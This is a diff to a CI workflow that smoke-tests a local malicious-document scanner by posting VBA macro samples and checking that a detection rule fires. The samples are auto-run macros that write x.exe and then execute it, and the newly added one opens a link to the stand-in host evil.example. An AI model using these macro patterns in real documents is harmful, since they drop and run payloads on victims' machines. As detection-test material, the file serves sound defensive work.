@@ -151,6 +151,11 @@ jobs:
           close_body=$(printf 'Private Sub Workbook_BeforeClose(Cancel As Boolean)\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  CreateObject("WScript.Shell").Run "cmd.exe /c x.exe"\nEnd Sub\n')
           close_match=$(printf '%s' "$close_body" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18081/scan)
           echo "close_match: $close_match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$close_match"
+
+          # Positive: FollowHyperlink (new $exec* entry) + auto-exec + write must fire.
+          fhl_body=$(printf 'Sub AutoOpen()\n  Set o = CreateObject("ADODB.Stream")\n  o.SaveToFile "x.exe"\n  ActiveWorkbook.FollowHyperlink "http://evil.example/x.exe"\nEnd Sub\n')
+          fhl_match=$(printf '%s' "$fhl_body" | curl -s -H "X-YARAD-Token: ci" --data-binary @- http://127.0.0.1:18081/scan)
+          echo "fhl_match: $fhl_match"; grep -q Maldoc_AutoExec_Write_Execute <<<"$fhl_match"
           docker rm -f ym
 
       - name: smoke (maldoc suspicious-keyword tier — count heuristic + shellcode-API)
